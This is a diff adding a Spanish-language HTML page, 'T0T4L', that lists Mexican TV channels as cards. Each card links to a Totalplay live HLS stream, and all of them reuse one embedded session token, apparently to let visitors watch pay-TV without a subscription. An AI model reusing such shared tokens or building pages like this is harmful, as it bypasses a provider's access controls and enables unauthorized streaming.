@@ -1,0 +1,706 @@
+﻿<!DOCTYPE html>
+<html dir='ltr' lang='es' prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<!-- Basic data -->
+<meta charset='UTF-8'/>
+<meta content='article' property='og:type'/>
+<!-- Responsive viewport -->
+<meta content='width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0' name='viewport'/>
+<!-- Title -->
+<title>T0T4L</title>
+<style type='text/css'>
+*{margin:0;padding:0;box-sizing:border-box;list-style:grid;}
+a{text-decoration:none;}
+body{background:#000;font-family:Nunito,sans-serif;}
+
+.cards{display:grid;grid-template-columns:repeat(5,1fr);grid;align-items: stretch;
+    justify-items: stretch;}
+
+.card{text-align:center;}
+.card img{
+    padding: 0px;
+    padding-top: 0px;
+    width: 90%;
+    height: 70%;
+border-radius:7px;}
+
+.card span{padding:0 .3rem;display:none;}
+a{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;} 
+.form__group{position:relative;padding:15px 0 0;margin:0 auto;margin-top:10px;margin-bottom:1rem;width:90%;}
+.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1.3rem;color:#fff;padding:7px 0;background:0 0;transition:border-color .2s;}
+.form__field::placeholder{color:transparent;}
+.form__field:placeholder-shown~.form__label{font-size:1.3rem;cursor:text;top:20px;}
+.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:#fff;}
+.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,red,#008cf7,red);border-image-slice:1;}
+.form__field:focus~.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:red;font-weight:700;}
+.form__field:invalid,.form__field:required{box-shadow:none;}
+
+
+
+/*Fix: Unnecessary elements removed*/
+.widget-item-control,.item-control.blog-admin,
+.continue,.loadmore,.thread-chrome.thread-collapsed,
+.singleton-element:not(.cookie-choices-info),
+.noAllowNewComments .comment-reply,
+.comments .hidden {display:none;}
+/*Fix: Show lightbox*/
+.CSS_LIGHTBOX{z-index:90001!important;}
+/*Fix: Image responsive*/
+a[imageanchor]:not([style*=float]){margin-right:0!important;margin-left:0!important;}
+.widget-content img,
+img[data-original-height],
+img[data-original-width] {height: auto;}
+/*Fix: Comment Editor*/
+#comment-editor{border:0;width:100%;min-height:220px;}
+.box{margin:0 auto;margin-bottom:2rem;width:60%;display:flex;align-items:center;}
+#caps{font-size:1.3rem;}
+.progress{background:#212042;width:100%;height:15px;border-radius:10px;}
+.progress-bar{width:0;opacity:0;height:15px;background:linear-gradient(to right,#228ee9,#1b7dbf);border-radius:10px;display:flex;justify-content:center;align-items:center;transition:1s ease;}
+.box span{padding-left:10px;color:#fff;}
+
+
+
+.xaviec {
+    background: #000;
+    position: fixed;
+    top: -16px;
+    right: -0.5em;
+    width: 20%;
+}
+
+
+.card h6{
+background:#212042;
+position:auto;
+margin-bottom:20%;
+color:#fff;
+font-size:0.9.5rem;
+border-radius:7px;
+}
+
+
+/* prueba de paginacion */
+.paginacion {
+	padding-top:10%;
+}
+
+.paginacion ul {
+	list-style:none;
+	text-align: center;
+}
+
+.paginacion ul li {
+	display:inline-block;
+	margin-right:5px;
+}
+
+.paginacion ul li a {
+	display:block;
+	padding:5px 10px;
+	color:#fff;
+	background:#024959;
+	text-decoration: none;
+}
+
+.paginacion ul li a:hover {
+	background:#ff0000;
+}
+
+.paginacion ul li .active {
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
+    transition-delay: 0.1s;
+}
+
+
+/* luz de neon alrededor */
+
+
+img:hover{
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000; /*efecto con el mouse*/
+}
+
+
+
+
+
+
+        /*          Pagination
+        ***************************/
+        /*Pagination Links Background*/
+
+
+
+.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.nav-links a,.nav-links span,.tagcloud a{background-color: #313036 }
+        @media screen and (max-width:62em){
+            .Menu>ul>li{border-bottom-color: #313036 }
+            .Menu .sub-menu a{background-color: #313036 }
+        }
+        /*Pagination Links Background Hover*/.menu-azlist ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{background-color: #de1212 }
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a:hover{background-color: #de1212 }
+        }
+        /*Pagination Links Color*/.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.tagcloud a{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a{color: #fff !important}
+        }
+        /*Pagination Links Color Hover*/.Menu li.menu-azlist:hover ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu li:hover .sub-menu li:hover a,.Menu .sub-menu li:hover:before{color: #fff !important}
+        }
+
+
+
+
+
+
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+}
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+    --dark-2: rgba(0,0,0,.2);
+    --dark-5: rgba(0,0,0,.5);
+    --light-1: rgba(255,255,255,.1);
+    --light-2: rgba(255,255,255,.2);
+    --light-7: rgba(255,255,255,.7);
+    --success: #28a745;
+    --danger: #FF5757;
+    --warning: #ffc107;
+    --size: 1rem;
+    --f-size: 1rem;
+    --family: 'Work Sans';
+}
+
+
+
+
+
+.pagination {
+    text-align: center;
+    font-weight: 700;
+    margin-bottom: var(--size);
+}
+
+a:-webkit-any-link {
+    color: -webkit-link;
+    cursor: pointer;
+    text-decoration: underline;
+}
+
+.btn.snd, .page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+.btn, button, [type=button], [type=reset], [type=submit], .pagination a, .extend, .tagcloud a, a.comment-reply-link {
+    cursor: pointer;
+    padding: .5rem 0.1rem;
+    display: inline-block;
+    vertical-align: top;
+    text-align: center;
+    line-height: 2rem;
+    width: auto;
+    background-color: var(--light-2);
+    color: var(--light);
+    min-width: 3rem;
+    border: 0;
+}
+
+
+.page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+
+
+
+
+
+
+
+.boton {
+    width: 8em;
+    height: 2em;
+border: 1px solid #2e5c8b;; /*anchura, estilo y color borde*/
+padding: 8px; /*espacio alrededor texto*/
+background-color: #20f504; /*color botón*/
+color: #ffffff; /*color texto*/
+text-decoration: none; /*decoración texto*/
+text-transform: uppercase; /*capitalización texto*/
+font-family: 'Helvetica', sans-serif; /*tipografía texto*/
+border-radius: 50px; /*bordes redondos*/
+    position: absolute;
+    top: 2em;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+<link href='https://fonts.googleapis.com/css2?family=Nunito&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Lato&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Montserrat&display=swap' rel='stylesheet'/>
+
+   <BR>
+   <BR>
+<nav class="navigation pagination">
+<div class="nav-links">
+ <!-- <a href="" ></a>
+      <a href="" ></a>  -->
+<a class="page-link current" href="./T0T4L.html" >TOTALPLAY</a>
+<a class="page-link" href="https://chanjdm.github.io/JDM/JDM/PLUTO.html"_blank" 
+>PLUTO TV</a>
+<a class="page-link " href="./VIX.html" >VIX TV</a>
+<a class="page-link" href="./PLUTOESPAÑA.html" >PLUTO ESPAÑA</a>
+
+ <!--  <a href="javascript:void(0)" class="extend"></a>
+       <a class="page-link" href="" ></a>   -->
+
+
+</div>
+</nav>
+
+
+
+</head>
+<body>
+
+
+
+
+
+
+
+<!--LAS DEMÁS-->
+<div class="xaviec">
+<div class="form__group field">
+<input autocomplete="off" type="input" onkeyup="myFunction()" class="form__field" placeholder="Buscar" name="name" id="myInput" required />
+<label for="name" class="form__label">Buscar</label>
+</div></div></div><br><br><br><br>
+<center><ul class="cards" id="cards">
+
+
+
+
+
+
+
+
+
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1973&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	https://cdn.fing.io/images/isp/MX/logo/totalplay_logo.png	"/> <h6>	CANAL TOTALPLAY	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2298&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s101096_dark_360w_270h.png	"/> <h6>	IMAGEN TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=7&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s116153_dark_360w_270h.png	"/> <h6>	AZTECA UNO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=317&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s116154_dark_360w_270h.png	"/> <h6>	AZTECA 7	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=11&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s92197_dark_360w_270h.png	"/> <h6>	AZ CLIC	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=70&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s61404_dark_360w_270h.png	"/> <h6>	AZ CORAZON	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=84&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s79968_dark_360w_270h.png	"/> <h6>	AZ MUNDO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2362&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s116151_dark_360w_270h.png	"/> <h6>	LAS ESTRELLAS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2312&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s28440_dark_360w_270h.png	"/> <h6>	TELEVISA PUEBLA	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2218&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s116152_dark_360w_270h.png	"/> <h6>	CANAL 5	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2307&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s26130_dark_360w_270h.png	"/> <h6>	CANAL 8 (Televisa Monterrey)	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=24&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s59528_dark_360w_270h.png	"/> <h6>	NU9VE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=25&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s116166_dark_360w_270h.png	"/> <h6>	ONCE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=44&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s28440_dark_360w_270h.png	"/> <h6>	MEXIQUENSE TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=32&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s34344_dark_360w_270h.png	"/> <h6>	TELEFORMULA	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2305&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s91505_dark_360w_270h.png	"/> <h6>	MULTIMEDIOS MTY	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1253&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s91505_dark_360w_270h.png	"/> <h6>	MULTIMEDIOS CDMX	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=401&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s45710_dark_360w_270h.png	"/> <h6>	APRENDE TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2156&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16292_dark_360w_270h.png	"/> <h6>	TVC	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2348&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s116157_dark_360w_270h.png	"/> <h6>	A+	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2331&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s20548_dark_360w_270h.png	"/> <h6>	CANAL DEL CONGRESO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=335&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16288_dark_360w_270h.png	"/> <h6>	DE PELICULA	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=121&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s74016_dark_360w_270h.png	"/> <h6>	DE PELICULA +	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1787&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s95687_dark_360w_270h.png	"/> <h6>	AZTECA CINEMA	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=60&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s46442_dark_360w_270h.png	"/> <h6>	FX	</h6></a></li>
